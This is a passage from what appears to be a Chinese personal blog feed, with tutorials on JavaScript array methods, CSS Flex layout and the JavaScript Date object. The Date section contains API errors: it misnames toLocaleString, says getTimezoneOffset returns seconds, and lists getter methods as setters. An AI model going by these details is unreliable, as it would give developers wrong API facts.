可选。用来指定按某种顺序进行排列的函数。如果省略，元素按照转换为的字符串的各个字符的Unicode位点进行排序。<br>返回值：返回排序后的数组。原数组已经被排序后的数组代替  </p></blockquote><pre><code class="javascript"><span class="comment">//数组排序</span><span class="keyword">var</span> arr = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">4</span>]arr.sort(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>{    <span class="keyword">return</span> a - b}) <span class="comment">// [1,2,3,4,5]</span><span class="comment">//对象可以按照某个属性排序：</span><span class="keyword">var</span> items = [  { <span class="attr">name</span>: <span class="string">'Edward'</span>, <span class="attr">value</span>: <span class="number">21</span> },  { <span class="attr">name</span>: <span class="string">'Sharpe'</span>, <span class="attr">value</span>: <span class="number">37</span> },  { <span class="attr">name</span>: <span class="string">'And'</span>, <span class="attr">value</span>: <span class="number">45</span> },  { <span class="attr">name</span>: <span class="string">'The'</span>, <span class="attr">value</span>: <span class="number">-12</span> },  { <span class="attr">name</span>: <span class="string">'Magnetic'</span> },  { <span class="attr">name</span>: <span class="string">'Zeros'</span>, <span class="attr">value</span>: <span class="number">37</span> }];<span class="comment">// sort by value</span>items.sort(<span class="function"><span class="keyword">function</span> (<span class="params">a, b</span>) </span>{  <span class="keyword">return</span> (a.value - b.value)});<span class="comment">// sort by name</span>items.sort(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>{  <span class="keyword">var</span> nameA = a.name.toUpperCase(); <span class="comment">// ignore upper and lowercase</span>  <span class="keyword">var</span> nameB = b.name.toUpperCase(); <span class="comment">// ignore upper and lowercase</span>  <span class="keyword">if</span> (nameA &lt; nameB) {    <span class="keyword">return</span> <span class="number">-1</span>;  }  <span class="keyword">if</span> (nameA &gt; nameB) {    <span class="keyword">return</span> <span class="number">1</span>;  }<span class="comment">// names must be equal</span>  <span class="keyword">return</span> <span class="number">0</span>;});</code></pre><p><strong>reverse()</strong><br>reverse()方法讲述组中的元素位置颠倒。  </p><blockquote><p>语法<br>arr.reverse()  </p></blockquote><pre><code class="javascript"><span class="keyword">var</span> array1 = [<span class="string">'one'</span>, <span class="string">'two'</span>, <span class="string">'three'</span>];<span class="keyword">var</span> reversed = array1.reverse(); <span class="built_in">console</span>.log(array1);<span class="comment">// expected output: Array ['three', 'two', 'one']</span><span class="built_in">console</span>.log(reversed);<span class="comment">// expected output: Array ['three', 'two', 'one']</span></code></pre><p><strong>fill()</strong><br>fill() 方法用一个固定值填充一个数组中从起始索引到终止索引内的全部元素。  </p><blockquote><p>语法<br>arr.fill(value[, start[, end]])  </p></blockquote><blockquote><p>参数<br><em>value</em><br>用来填充数组元素的值。<br><em>start 可选</em><br>起始索引，默认值为0。<br><em>end 可选</em><br>终止索引，默认值为 this.length。  </p></blockquote><blockquote><p>返回值：修改后的数组</p></blockquote><pre><code class="javascript"><span class="keyword">var</span> array1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];<span class="comment">// fill with 0 from position 2 until position 4</span><span class="built_in">console</span>.log(array1.fill(<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>));<span class="comment">// expected output: [1, 2, 0, 0]</span><span class="comment">// fill with 5 from position 1</span><span class="built_in">console</span>.log(array1.fill(<span class="number">5</span>, <span class="number">1</span>));<span class="comment">// expected output: [1, 5, 5, 5]</span><span class="built_in">console</span>.log(array1.fill(<span class="number">6</span>));<span class="comment">// expected output: [6, 6, 6, 6]</span></code></pre><p><strong>copyWithin()</strong><br>copyWithin() 方法浅复制数组的一部分到同一数组中的另一个位置，并返回它，而不修改其大小。  </p><blockquote><p>语法<br>arr.copyWithin(target[, start[, end]])  </p></blockquote><blockquote><p>参数<br><em>target</em><br>　　0 为基底的索引，复制序列到该位置。如果是负数，target 将从末尾开始计算。<br>　　如果 target 大于等于 arr.length，将会不发生拷贝。如果 target 在 start 之后，复制的序列将被修改以符合 arr.length。<br><em>start</em><br>　　0 为基底的索引，开始复制元素的起始位置。如果是负数，start 将从末尾开始计算。<br>　　如果 start 被忽略，copyWithin 将会从0开始复制。<br><em>end</em><br>　　0 为基底的索引，开始复制元素的结束位置。copyWithin 将会拷贝到该位置，但不包括 end 这个位置的元素。如果是负数， end 将从末尾开始计算。<br>　　如果 end 被忽略，copyWithin 将会复制到 arr.length。  </p></blockquote><blockquote><p>返回值：改变了的数组。</p></blockquote><pre><code class="javascript"><span class="keyword">var</span> array1 = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];<span class="comment">// place at position 0 the element between position 3 and 4</span><span class="built_in">console</span>.log(array1.copyWithin(<span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>));<span class="comment">// expected output: Array [4, 2, 3, 4, 5]</span><span class="comment">// place at position 1 the elements after position 3</span><span class="built_in">console</span>.log(array1.copyWithin(<span class="number">1</span>, <span class="number">3</span>));<span class="comment">// expected output: Array [4, 4, 5, 4, 5]</span></code></pre><p><strong>访问方法</strong>  </p><p>下面的这些方法会改变调用它们的对象自身的值：  </p></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文总结了一些js数组的常用方法&lt;br&gt;
    
    </summary>
    
      <category term="Javascript" scheme="https://jiuylq.github.io/categories/Javascript/"/>
    
    
      <category term="Array" scheme="https://jiuylq.github.io/tags/Array/"/>
    
  </entry>
  
  <entry>
    <title>Flex布局</title>
    <link href="https://jiuylq.github.io/2018/03/07/Flex/"/>
    <id>https://jiuylq.github.io/2018/03/07/Flex/</id>
    <published>2018-03-07T07:51:28.000Z</published>
    <updated>2019-04-07T05:10:31.072Z</updated>
    
    <content type="html"><![CDATA[<p>Flex布局<br>Flex 是 Flexible Box 的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。<br><a id="more"></a></p><the rest of contents | 余下全文><h2 id="Flex-布局"><a href="#Flex-布局" class="headerlink" title="Flex 布局"></a>Flex 布局</h2><blockquote><p><strong>Flex 是 Flexible Box 的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。</strong></p></blockquote><p>一、容器</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//容器设置</span><br><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//行内元素也可设置</span><br><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-flex;</span><br><span class="line">&#125;</span><br><span class="line">//Webkit 内核的浏览器，必须加上-webkit 前缀。</span><br></pre></td></tr></table></figure><p><em>注意，设为 Flex 布局以后，子元素的 float、clear 和 vertical-align 属性将失效。</em></p><p>二、容器属性</p><p><em>容器默认存在两根轴：水平的主轴（main axis）和垂直的交叉轴（cross axis）。主轴的开始位置（与边框的交叉点）叫做 main start，结束位置叫做 main end；交叉轴的开始位置叫做 cross start，结束位置叫做 cross end。项目默认沿主轴排列。单个项目占据的主轴空间叫做 main size，占据的交叉轴空间叫做 cross size。</em></p><p><em>以下 6 个属性设置在容器上。</em></p><blockquote><p>flex-direction || flex-wrap || flex-flow || justify-content || align-items || align-content</p></blockquote><ol><li><p>flex-direction</p><p><strong>flex-direction 属性决定主轴的方向（即项目的排列方向）。</strong></p><ul><li>row（默认值）：主轴为水平方向，起点在左端。</li><li>row-reverse：主轴为水平方向，起点在右端。</li><li>column：主轴为垂直方向，起点在上沿。</li><li>column-reverse：主轴为垂直方向，起点在下沿。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">box</span> &#123;</span><br><span class="line">  <span class="attribute">flex-direction</span>: row | row-reverse | column | column-reverse;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>flex-wrap</p><p><strong>默认情况下，项目都排在一条线（又称”轴线”）上。flex-wrap 属性定义，如果一条轴线排不下，如何换行。</strong></p><ul><li>nowrap（默认）：不换行。</li><li>wrap：换行，第一行在上方。</li><li>wrap-reverse：换行，第一行在下方。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">flex-wrap</span>: nowrap | wrap | wrap-reverse;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>flex-flow</p><p><strong>flex-flow 属性是 flex-direction 属性和 flex-wrap 属性的简写形式，默认值为 row nowrap。</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">flex-flow</span>: &lt;flex-direction&gt; || &lt;flex-wrap&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>justify-content</p><p><strong>justify-content 属性定义了项目在主轴上的对齐方式。</strong><br><em>它可能取 5 个值，具体对齐方式与轴的方向有关。下面假设主轴为从左到右。</em></p><ul><li>flex-start（默认值）：左对齐</li><li>flex-end：右对齐</li><li>center： 居中</li><li>space-between：两端对齐，项目之间的间隔都相等。</li><li>space-around：每个项目两侧的间隔相等。所以，项目之间的间隔比项目与边框的间隔大一倍。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">justify-content</span>: flex-start | flex-end | center | space-between |</span><br><span class="line">    space-around;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>align-items</p><p><strong>align-items 属性定义项目在交叉轴上如何对齐。</strong></p><p><em>它可能取 5 个值。具体的对齐方式与交叉轴的方向有关，下面假设交叉轴从上到下。</em></p><ul><li>flex-start：交叉轴的起点对齐。</li><li>flex-end：交叉轴的终点对齐。</li><li>center：交叉轴的中点对齐。</li><li>baseline: 项目的第一行文字的基线对齐。</li><li>stretch（默认值）：如果项目未设置高度或设为 auto，将占满整个容器的高度。</li></ul></li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">align-items</span>: flex-start | flex-end | center | baseline | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="6"><li><p>align-content</p><p><strong>align-content 属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用。</strong></p><ul><li>flex-start：与交叉轴的起点对齐。</li><li>flex-end：与交叉轴的终点对齐。</li><li>center：与交叉轴的中点对齐。</li><li>space-between：与交叉轴两端对齐，轴线之间的间隔平均分布。</li><li>space-around：每根轴线两侧的间隔都相等。所以，轴线之间的间隔比轴线与边框的间隔大一倍。</li><li>stretch（默认值）：轴线占满整个交叉轴。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">align-content</span>: flex-start | flex-end | center | space-between |</span><br><span class="line">    space-around | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>三、项目的属性</p><p><em>以下 6 个属性设置在项目上。</em></p><blockquote><p>order || flex-grow || flex-shrink || flex-basis || flex || align-self</p></blockquote><ol><li><p>order</p><p><strong>order 属性定义项目的排列顺序。数值越小，排列越靠前，默认为 0。</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">order</span>: &lt;integer&gt;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>flex-grow</p><p><strong>flex-grow 属性定义项目的放大比例，默认为 0，即如果存在剩余空间，也不放大。</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-grow</span>: &lt;number&gt;; <span class="comment">/* default 0 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>如果所有项目的 flex-grow 属性都为 1，则它们将等分剩余空间（如果有的话）。如果一个项目的 flex-grow 属性为 2，其他项目都为 1，则前者占据的剩余空间将比其他项多一倍</em></p></li><li><p>flex-shrink</p><p><strong>flex-shrink 属性定义了项目的缩小比例，默认为 1，即如果空间不足，该项目将缩小。</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-shrink</span>: &lt;number&gt;; <span class="comment">/* default 1 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>如果所有项目的 flex-shrink 属性都为 1，当空间不足时，都将等比例缩小。如果一个项目的 flex-shrink 属性为 0，其他项目都为 1，则空间不足时，前者不缩小。负值对该属性无效。</em></p></li><li><p>flex-basis</p><p><strong>flex-basis 属性定义了在分配多余空间之前，项目占据的主轴空间（main size）。浏览器根据这个属性，计算主轴是否有多余空间。它的默认值为 auto，即项目的本来大小。</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex-basis</span>: &lt;length&gt; | auto; <span class="comment">/* default auto */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>它可以设为跟 width 或 height 属性一样的值（比如 350px），则项目将占据固定空间。</em></p></li><li><p>flex</p><p><strong>flex 属性是 flex-grow, flex-shrink 和 flex-basis 的简写，默认值为 0 1 auto。后两个属性可选。</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">flex</span>: none | [ &lt; <span class="string">"flex-grow"</span> &gt; &lt; <span class="string">"flex-shrink"</span> &gt;? || &lt; <span class="string">"flex-basis"</span> &gt; ];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>该属性有两个快捷值：auto (1 1 auto) 和 none (0 0 auto)。建议优先使用这个属性，而不是单独写三个分离的属性，因为浏览器会推算相关值。</em></p></li><li><p>align-self</p><p><strong>align-self 属性允许单个项目有与其他项目不一样的对齐方式，可覆盖 align-items 属性。默认值为 auto，表示继承父元素的 align-items 属性，如果没有父元素，则等同于 stretch。</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.item</span> &#123;</span><br><span class="line">  <span class="attribute">align-self</span>: auto | flex-start | flex-end | center | baseline | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>该属性可能取 6 个值，除了 auto，其他都与 align-items 属性完全一致。</em></p></li></ol><p><a href="https://www.runoob.com/w3cnote/flex-grammar.html" target="_blank" rel="noopener">https://www.runoob.com/w3cnote/flex-grammar.html</a><br>（完）</p></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Flex布局&lt;br&gt;Flex 是 Flexible Box 的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。&lt;br&gt;
    
    </summary>
    
      <category term="CSS" scheme="https://jiuylq.github.io/categories/CSS/"/>
    
    
      <category term="CSS" scheme="https://jiuylq.github.io/tags/CSS/"/>
    
  </entry>
  
  <entry>
    <title>js-date</title>
    <link href="https://jiuylq.github.io/2018/01/07/js-date/"/>
    <id>https://jiuylq.github.io/2018/01/07/js-date/</id>
    <published>2018-01-07T07:51:28.000Z</published>
    <updated>2018-10-19T12:57:32.776Z</updated>
    
    <content type="html"><![CDATA[<p>唉，最近越来越懒了，博客拖更了。<br>今天让我们来谈谈javascript中的日期Date对象，及其相关的用法。<br><a id="more"></a></p><the rest of contents | 余下全文><h2 id="一、日期对象"><a href="#一、日期对象" class="headerlink" title="一、日期对象"></a>一、日期对象</h2><blockquote><p>在javascript中并没有日期型的数据类型，但是提供了一个日期对象可以操作日期和时间。<br>日期对象的创建：<br>new Date();  </p></blockquote><h2 id="二、将日期对象转换为字符串"><a href="#二、将日期对象转换为字符串" class="headerlink" title="二、将日期对象转换为字符串"></a>二、将日期对象转换为字符串</h2><blockquote><p>将日期对象转换为字符串可以使用以下4种方法：<br>date.toString();//将日期对象转换为字符串时，采用的是本地时间<br>date.toLocalString();//将日期对象转换为字符串，采用的是本地时间，显示的是地方日期的格式<br>date.toUTCString();//将日期对象转换为字符串时，采用的是世界时间。<br>date.toGMTString();//将日期对象转换为字符串时，采用的是GMT时间，但是已被禁止使用，一般用toUTCString()方法来替换。</p></blockquote><h2 id="三、将日期对象中的日期和时间转换为字符串"><a href="#三、将日期对象中的日期和时间转换为字符串" class="headerlink" title="三、将日期对象中的日期和时间转换为字符串"></a>三、将日期对象中的日期和时间转换为字符串</h2><blockquote><p>date.toDateString();//将日期部分转换为字符串，本地时间<br>date.toLocalDateString();//将日期部分转换为字符串，采用的是本地时间，显示的是地方日期的格式<br>date.toTimeString();//将时间部分转换为字符串，本地时间<br>date.toLocalTimeString();将时间部分转换为字符串，采用的是本地时间，显示的是地方日期的格式</p></blockquote><h2 id="四、日期对象中的日期"><a href="#四、日期对象中的日期" class="headerlink" title="四、日期对象中的日期"></a>四、日期对象中的日期</h2><blockquote><p>date.getYear();//获取年份，但不建议使用。<br>date.getFullYear();//获取年份，，以四位数显式，建议使用<br>date.getMonth();//获取月份，值为0-11，一月份为0，二月份为1…<br>date.getDate();//获取天数，即一个月中的某一天<br>date.getDay();//获取一周中的第几天，值为0-6，周日为0…</p></blockquote><h2 id="五、日期对象中的时间"><a href="#五、日期对象中的时间" class="headerlink" title="五、日期对象中的时间"></a>五、日期对象中的时间</h2><blockquote><p>date.getHours();//返回小时部分<br>date.getMinutes();//返回分钟部分<br>date.getSeconds();//返回秒钟部分<br>date.getMilliseconds();//返回毫秒部分<br>date.getTime();//返回日期对象中的时间与1970年1月1日0时0分0秒所间隔的毫秒数<br>date.getTimezoneoffset();//返回日期对象中的时间与UTC之间的时差数，单位为秒。</p></blockquote><h2 id="六、设置日期对象中的日期e"><a href="#六、设置日期对象中的日期e" class="headerlink" title="六、设置日期对象中的日期e"></a>六、设置日期对象中的日期e</h2><blockquote><p>date.setYear(year);//不建议使用<br>date.setFullYear(year,month,day);//year四位数;month：0-11，该参数可省略;day：1-31， 该参数可省略<br>date.setMonth(month,day);//month：0-11;day：1-31， 该参数可省略<br>date.getDate(day);//day：1-31</p></blockquote><h2 id="七、设置日期对象中的时间"><a href="#七、设置日期对象中的时间" class="headerlink" title="七、设置日期对象中的时间"></a>七、设置日期对象中的时间</h2><blockquote><p>date.getHours(hours,minutes,seconds,milliseconds);//hours:0-23,minutes:0-59,可省略，seconds:0-59,可省略milliseconds:0-999，可省略<br>date.getMinutes(minutes,seconds,milliseconds);//minutes:0-59,seconds:0-59,可省略milliseconds:0-999，可省略<br>date.getSeconds(seconds,milliseconds);// seconds:0-59,milliseconds:0-999，可省略<br>date.getMilliseconds(milliseconds);//,milliseconds:0-999</p></blockquote><h2 id="八、与毫秒相关的方法"><a href="#八、与毫秒相关的方法" class="headerlink" title="八、与毫秒相关的方法"></a>八、与毫秒相关的方法</h2><blockquote><p>date.setTime(millisecinds);milliseconds代表设置的时间与1970年1月1日0时0分0秒所间隔的毫秒数<br>date.valueOf();返回日期对象中的时间与1970年1月1日0时0分0秒所间隔的毫秒数<br>date.parse(str);返回str参数所代表的时间与1970年1月1日0时0分0秒所间隔的毫秒数<br>date.UTC(year,month,day,hours,minutes,seconds,milliseconds);将参数所代表的日期转换成与1970年1月1日0时0分0秒所间隔的毫秒数</p></blockquote><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a><em>实例</em></h3><p>1、获取时间截<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一</span></span><br><span class="line"><span class="keyword">var</span> timestamp = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime();   <span class="comment">//new Date("2012/7/25 20:11:11").getTime()</span></span><br><span class="line"><span class="comment">//二</span></span><br><span class="line"><span class="keyword">var</span> timestamp = (<span class="keyword">new</span> <span class="built_in">Date</span>()).valueOf()</span><br><span class="line"><span class="comment">// 三</span></span><br><span class="line"><span class="keyword">var</span> timestamp = +<span class="keyword">new</span> <span class="built_in">Date</span>()  <span class="comment">//相当于ToNumber(new Date())</span></span><br><span class="line"><span class="comment">// 四</span></span><br><span class="line"><span class="keyword">var</span> timestamp = <span class="built_in">Date</span>.now()</span><br></pre></td></tr></table></figure></p><p>2、格式化时间<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用方法：var val=new Date("2012/7/25 20:11:11").getTime() var crtTime = new Date(val); dateFtt("yyyy-MM-dd q hh:mm:ss",crtTime);</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dateFtt</span>(<span class="params">fmt,date</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> o = &#123;   </span><br><span class="line">    <span class="string">"M+"</span> : date.getMonth()+<span class="number">1</span>,                 <span class="comment">//月份   </span></span><br><span class="line">    <span class="string">"d+"</span> : date.getDate(),                    <span class="comment">//日   </span></span><br><span class="line">    <span class="string">"h+"</span> : date.getHours(),                   <span class="comment">//小时   </span></span><br><span class="line">    <span class="string">"m+"</span> : date.getMinutes(),                 <span class="comment">//分   </span></span><br><span class="line">    <span class="string">"s+"</span> : date.getSeconds(),                 <span class="comment">//秒   </span></span><br><span class="line">    <span class="string">"q+"</span> : <span class="built_in">Math</span>.floor((date.getMonth()+<span class="number">3</span>)/<span class="number">3</span>), <span class="comment">//季度   </span></span><br><span class="line">    <span class="string">"S"</span>  : date.getMilliseconds()             <span class="comment">//毫秒   </span></span><br><span class="line">&#125;;   </span><br><span class="line"><span class="keyword">if</span>(<span class="regexp">/(y+)/</span>.test(fmt))   </span><br><span class="line">    fmt=fmt.replace(<span class="built_in">RegExp</span>.$<span class="number">1</span>, (date.getFullYear()+<span class="string">""</span>).substr(<span class="number">4</span> - <span class="built_in">RegExp</span>.$<span class="number">1.</span>length));   </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> k <span class="keyword">in</span> o)   </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"("</span>+ k +<span class="string">")"</span>).test(fmt))   </span><br><span class="line">fmt = fmt.replace(<span class="built_in">RegExp</span>.$<span class="number">1</span>, (<span class="built_in">RegExp</span>.$<span class="number">1.</span>length==<span class="number">1</span>) ? (o[k]) : ((<span class="string">"00"</span>+ o[k]).substr((<span class="string">""</span>+ o[k]).length)));   </span><br><span class="line"><span class="keyword">return</span> fmt;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* * 对Date的扩展，将 Date 转化为指定格式的String * 月(M)、日(d)、12小时(h)、24小时(H)、分(m)、秒(s)、周(E)、季度(q)</span></span><br><span class="line"><span class="comment">    可以用 1-2 个占位符 * 年(y)可以用 1-4 个占位符，毫秒(S)只能用 1 个占位符(是 1-3 位的数字) * eg: * (new</span></span><br><span class="line"><span class="comment">    Date()).pattern("yyyy-MM-dd hh:mm:ss.S")==&gt; 2006-07-02 08:09:04.423      </span></span><br><span class="line"><span class="comment"> * (new Date()).pattern("yyyy-MM-dd E HH:mm:ss") ==&gt; 2009-03-10 二 20:09:04      </span></span><br><span class="line"><span class="comment"> * (new Date()).pattern("yyyy-MM-dd EE hh:mm:ss") ==&gt; 2009-03-10 周二 08:09:04      </span></span><br><span class="line"><span class="comment"> * (new Date()).pattern("yyyy-MM-dd EEE hh:mm:ss") ==&gt; 2009-03-10 星期二 08:09:04      </span></span><br><span class="line"><span class="comment"> * (new Date()).pattern("yyyy-M-d h:m:s.S") ==&gt; 2006-7-2 8:9:4.18      </span></span><br><span class="line"><span class="comment"> */</span>        </span><br><span class="line"><span class="built_in">Date</span>.prototype.pattern=<span class="function"><span class="keyword">function</span>(<span class="params">fmt</span>) </span>&#123;         </span><br><span class="line">    <span class="keyword">var</span> o = &#123;         </span><br><span class="line">    <span class="string">"M+"</span> : <span class="keyword">this</span>.getMonth()+<span class="number">1</span>, <span class="comment">//月份         </span></span><br><span class="line">    <span class="string">"d+"</span> : <span class="keyword">this</span>.getDate(), <span class="comment">//日         </span></span><br><span class="line">    <span class="string">"h+"</span> : <span class="keyword">this</span>.getHours()%<span class="number">12</span> == <span class="number">0</span> ? <span class="number">12</span> : <span class="keyword">this</span>.getHours()%<span class="number">12</span>, <span class="comment">//小时         </span></span><br><span class="line">    <span class="string">"H+"</span> : <span class="keyword">this</span>.getHours(), <span class="comment">//小时         </span></span><br><span class="line">    <span class="string">"m+"</span> : <span class="keyword">this</span>.getMinutes(), <span class="comment">//分         </span></span><br><span class="line">    <span class="string">"s+"</span> : <span class="keyword">this</span>.getSeconds(), <span class="comment">//秒         </span></span><br><span class="line">    <span class="string">"q+"</span> : <span class="built_in">Math</span>.floor((<span class="keyword">this</span>.getMonth()+<span class="number">3</span>)/<span class="number">3</span>), <span class="comment">//季度         </span></span><br><span class="line">    <span class="string">"S"</span> : <span class="keyword">this</span>.getMilliseconds() <span class="comment">//毫秒         </span></span><br><span class="line">    &#125;;         </span><br><span class="line">    <span class="keyword">var</span> week = &#123;         </span><br><span class="line">    <span class="string">"0"</span> : <span class="string">"\u65e5"</span>,         </span><br><span class="line">    <span class="string">"1"</span> : <span class="string">"\u4e00"</span>,         </span><br><span class="line">    <span class="string">"2"</span> : <span class="string">"\u4e8c"</span>,         </span><br><span class="line">    <span class="string">"3"</span> : <span class="string">"\u4e09"</span>,         </span><br><span class="line">    <span class="string">"4"</span> : <span class="string">"\u56db"</span>,         </span><br><span class="line">    <span class="string">"5"</span> : <span class="string">"\u4e94"</span>,         </span><br><span class="line">    <span class="string">"6"</span> : <span class="string">"\u516d"</span>        </span><br><span class="line">    &#125;;         </span><br><span class="line">    <span class="keyword">if</span>(<span class="regexp">/(y+)/</span>.test(fmt))&#123;         </span><br><span class="line">        fmt=fmt.replace(<span class="built_in">RegExp</span>.$<span class="number">1</span>, (<span class="keyword">this</span>.getFullYear()+<span class="string">""</span>).substr(<span class="number">4</span> - <span class="built_in">RegExp</span>.$<span class="number">1.</span>length));         </span><br><span class="line">    &#125;         </span><br><span class="line">    <span class="keyword">if</span>(<span class="regexp">/(E+)/</span>.test(fmt))&#123;         </span><br><span class="line">        fmt=fmt.replace(<span class="built_in">RegExp</span>.$<span class="number">1</span>, ((<span class="built_in">RegExp</span>.$<span class="number">1.</span>length&gt;<span class="number">1</span>) ? (<span class="built_in">RegExp</span>.$<span class="number">1.</span>length&gt;<span class="number">2</span> ? <span class="string">"\u661f\u671f"</span> : <span class="string">"\u5468"</span>) : <span class="string">""</span>)+week[<span class="keyword">this</span>.getDay()+<span class="string">""</span>]);         </span><br><span class="line">    &#125;         </span><br><span class="line">    <span class="keyword">for</span>(<span 